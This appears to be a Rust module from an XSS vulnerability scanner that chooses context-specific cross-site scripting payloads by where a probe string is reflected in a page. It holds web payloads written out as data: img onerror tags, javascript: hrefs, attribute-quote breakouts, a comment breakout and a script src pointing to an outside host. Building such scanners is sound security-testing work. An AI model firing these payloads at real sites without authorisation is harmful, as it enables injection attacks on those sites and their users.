#[path = "parser.rs"] mod parser;
use crate::scan::xss::parser::Location;
use std::collections::HashMap;
use regex::Regex;

pub fn match_qoutes(d: &str,s: &str) -> bool {
    let re = Regex::new(&format!(r#"'(?:[^\\\\'\\\\]|\\\\.)*{}(?:[^\\\\'\\\\]|\\\\.)*'"#,s)).unwrap();
    re.is_match(d)
}

pub fn match_double_qoutes(d: &str, s: &str) -> bool {
    // regex: "(?:[^"\\\\]|\\\\.)*khaled(?:[^"\\\\]|\\\\.)*"
    let c = &format!(r#""*(?:[^"\\\\]|\\\\.)*{}(?:[^"\\\\]|\\\\.)*""#,s);
    let re = Regex::new(c).unwrap();
    re.is_match(d)
}



pub struct PayloadGen<'a> {
    pub location: &'a Location,
    pub response: &'a str,
    pub payload: &'a str,
    pub payloads: Vec<&'a str>,
}

impl <'a> PayloadGen<'a> {
    pub fn new(response: &'a str,location: &'a Location,payload: &'a str,payloads: Vec<&'a str>) -> Self {
        PayloadGen {
            location,
            response,
            payloads,
            payload,
        }
    }

    pub fn analyze(&self) -> Vec<String> {
        match *self.location {
            Location::Text(ref text) => {
                vec!["<img src=x onerror=alert()>".to_string()]
            },
            Location::TagName(ref tag_name) => {
                let tag_without_payload = tag_name.replace("hackerman","");
                if tag_without_payload.len() == 0 {
                    vec!["img/onerror=alert()".to_string()]
                } else {
                    if tag_without_payload.starts_with("a") {
                        vec![
                            "/href='javascript:alert()'".to_string(),
                            "/href='JaVaScripT:alert()'".to_string(),
                        ]
                    } else if tag_without_payload.starts_with("script") {
                        vec![
                            "/src=//14.rs".to_string(),
                        ]
                    } else if tag_without_payload.starts_with("iframe") {
                        vec![
                            "/src='javascript:alert()'".to_string(),
                        ]
                    } else {
                        vec![]
                    }
                }
            },
            Location::Comment(ref comment) => {
                vec!["--><img src=x onerror=alert()>".to_string()]
            },
            Location::AttrName(ref attr_name) => {
                /*
                 * Just match the attribute name
                 * */
                if attr_name.starts_with("on") {
                    vec!["onerror=alert()".to_string()]
                } else {
                    vec!["onerrokasofaksfopakr=alert() ".to_string()]
                }
            },
            Location::AttrValue(ref attr_value) => {
                // match if attr_value is a js command
                match match_double_qoutes(self.response,attr_value.as_str()) {
                    true => {
                        vec![
                            "\" onerror=\"alert()".to_string(),
                            "\\\" onerror=\"alert()".to_string(),
                            "\"\"\" onerror=\"alert()".to_string(),
                            "\"\"\"\" onerror=\"alert()".to_string(),
                            "\"\"\"\"\" onerror=\"alert()".to_string(),
                        ]
                    },
                    false => {
                        vec![
                            "' onerror='alert()".to_string(),
                            "\\' onerror='alert()".to_string(),
                            "''' onerror='alert()".to_string(),
                        ]
                    },
                }
            },
        }

    } 
}


// single qoute regex match
// regex: '([^'\\]|\\.)*'
// (?:[^\'\\\\]|\\\\.)*'+khaled+'(?:[^\'\\\\]|\\\\.)
pub fn generate_xss_payload(_reflect: &Location) -> HashMap<&str, String> {
    let mut payload = HashMap::new(); 
    match _reflect {
        Location::AttrValue(ref _attr) => {
            payload.insert("onerror","\"onerror=\"alert()".to_string());
            payload.insert("onmouseover","\"onmouseover=\"alert()".to_string());
            payload.insert("onmouseout","\"onmouseout=\"alert()".to_string());
        },
        _ => {}
    };
    payload
}
